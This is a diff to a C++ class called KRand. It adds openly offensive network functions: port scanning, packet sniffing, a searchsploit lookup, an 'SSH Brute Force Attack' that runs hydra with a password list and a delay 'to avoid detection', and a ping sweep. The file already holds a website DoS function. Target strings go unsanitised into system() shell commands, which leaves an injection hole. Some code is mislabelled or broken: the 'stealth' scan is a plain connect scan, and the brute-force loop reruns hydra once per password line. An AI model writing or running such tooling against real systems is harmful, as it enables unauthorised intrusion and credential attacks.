@@ -35,6 +35,14 @@ SOFTWARE.
 #include <filesystem>
 #include <iostream>
 #include <cpr/cpr.h>
+#include <cstring>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <netinet/ip.h>
+#include <pcap.h>
 
 #ifdef _WIN32
     #include <windows.h>
@@ -52,28 +60,6 @@ SOFTWARE.
 
 namespace fs = std::filesystem;
 
-// Helper function to generate a timestamp-based key
-std::string kala_time_key() {
-    auto now = std::chrono::system_clock::now();
-    auto now_time_t = std::chrono::system_clock::to_time_t(now);
-    std::stringstream ss;
-    ss << std::put_time(std::localtime(&now_time_t), "%Y%m%d%H%M%S");
-    return ss.str();
-}
-
-// Simple XOR encryption (for demonstration purposes only)
-std::string kala_encrypt(const std::string &plaintext, const std::string &key) {
-    std::string ciphertext = plaintext;
-    for (size_t i = 0; i < plaintext.size(); ++i) {
-        ciphertext[i] = plaintext[i] ^ key[i % key.size()];
-    }
-    return ciphertext;
-}
-
-// Simple XOR decryption (for demonstration purposes only)
-std::string kala_decrypt(const std::string &ciphertext, const std::string &key) {
-    return kala_encrypt(ciphertext, key); // XOR encryption is symmetric
-}
 
 // Constructor
 KRand::KRand() {
@@ -90,6 +76,29 @@ KRand::~KRand() {
 #ifdef _WIN32
     WSACleanup();
 #endif
+}
+
+// Helper function to generate a timestamp-based key
+std::string  KRand::generate_time_based_key() {
+    auto now = std::chrono::system_clock::now();
+    auto now_time_t = std::chrono::system_clock::to_time_t(now);
+    std::stringstream ss;
+    ss << std::put_time(std::localtime(&now_time_t), "%Y%m%d%H%M%S");
+    return ss.str();
+}
+
+// Simple XOR encryption (for demonstration purposes only)
+std::string KRand::encrypt(const std::string &plaintext, const std::string &key) {
+    std::string ciphertext = plaintext;
+    for (size_t i = 0; i < plaintext.size(); ++i) {
+        ciphertext[i] = plaintext[i] ^ key[i % key.size()];
+    }
+    return ciphertext;
+}
+
+// Simple XOR decryption (for demonstration purposes only)
+std::string KRand::decrypt(const std::string &ciphertext, const std::string &key) {
+    return encrypt(ciphertext, key); // XOR encryption is symmetric
 }
 
 // Generate RSA key pair and save to files
@@ -433,6 +442,122 @@ void KRand::do_dos_website(const std::string &target_url, bool loop, int count, 
             std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms)); // Add delay
         }
     }
+}
+
+void KRand::port_scan(const std::string &target_ip, int start_port, int end_port) {
+    for (int port = start_port; port <= end_port; ++port) {
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) {
+            std::cerr << "Socket creation failed for port " << port << std::endl;
+            continue;
+        }
+
+        sockaddr_in serverAddr{};
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(port);
+        inet_pton(AF_INET, target_ip.c_str(), &serverAddr.sin_addr);
+
+        if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == 0) {
+            std::cout << "Port " << port << " is open" << std::endl;
+        }
+
+        close(sock);
+    }
+}
+
+#define PACKET_SIZE 4096
+
+/*** Advanced Port Scan (SYN, UDP, Stealth Scan) ***/
+void KRand::advanced_port_scan(const std::string &target_ip) {
+    std::cout << "[+] Starting advanced port scan on " << target_ip << std::endl;
+
+    for (int port = 1; port <= 1024; ++port) {  // Scanning ports 1-1024
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) {
+            std::cerr << "[-] Error creating socket.\n";
+            continue;
+        }
+
+        struct sockaddr_in target;
+        target.sin_family = AF_INET;
+        target.sin_port = htons(port);
+        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
+
+        if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
+            std::cout << "[+] Port " << port << " is OPEN." << std::endl;
+        }
+        close(sock);
+    }
+
+    std::cout << "[+] Advanced port scan completed." << std::endl;
+}
+
+/*** Packet Sniffing using libpcap ***/
+void KRand::packet_sniffing() {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t *handle;
+    struct pcap_pkthdr header;
+    const u_char *packet;
+
+    handle = pcap_open_live("eth0", PACKET_SIZE, 1, 1000, errbuf);
+    if (handle == nullptr) {
+        std::cerr << "[-] Error opening device for packet capture: " << errbuf << std::endl;
+        return;
+    }
+
+    std::cout << "[+] Capturing packets...\n";
+    while (true) {
+        packet = pcap_next(handle, &header);
+        if (packet) {
+            std::cout << "[*] Captured packet of size: " << header.len << " bytes\n";
+        }
+    }
+
+    pcap_close(handle);
+}
+
+/*** Automated CVE Vulnerability Detection ***/
+void KRand::vulnerability_scan() {
+    std::cout << "[+] Checking system for known vulnerabilities...\n";
+    system("searchsploit -u");  // Update ExploitDB
+    system("searchsploit --cve 2024");  // Example: Find 2024 CVEs
+}
+
+/*** SSH Brute Force Attack ***/
+void KRand::ssh_brute_force(const std::string &target_ip, const std::string &user, const std::string &password_list) {
+    std::ifstream file(password_list);
+    if (!file) {
+        std::cerr << "[-] Error opening password list file.\n";
+        return;
+    }
+
+    std::string password;
+    while (std::getline(file, password)) {
+        std::cout << "[*] Trying password: " << password << std::endl;
+
+        std::string command = "hydra -l " + user + " -P " + password_list + " ssh://" + target_ip;
+        system(command.c_str());
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Delay to avoid detection
+    }
+
+    file.close();
+}
+
+/*** Network Enumeration (Finding Live Hosts) ***/
+void KRand::network_enumeration(const std::string &network_range) {
+    std::cout << "[+] Enumerating network: " << network_range << std::endl;
+
+    for (int i = 1; i <= 255; ++i) {
+        std::string ip = network_range + "." + std::to_string(i);
+        std::string command = "ping -c 1 -W 1 " + ip + " > /dev/null";
+
+        if (system(command.c_str()) == 0) {
+            std::cout << "[+] Live Host Found: " << ip << std::endl;
+        }
+    }
+
+    std::cout << "[+] Network Enumeration Completed." << std::endl;
 }
 
 
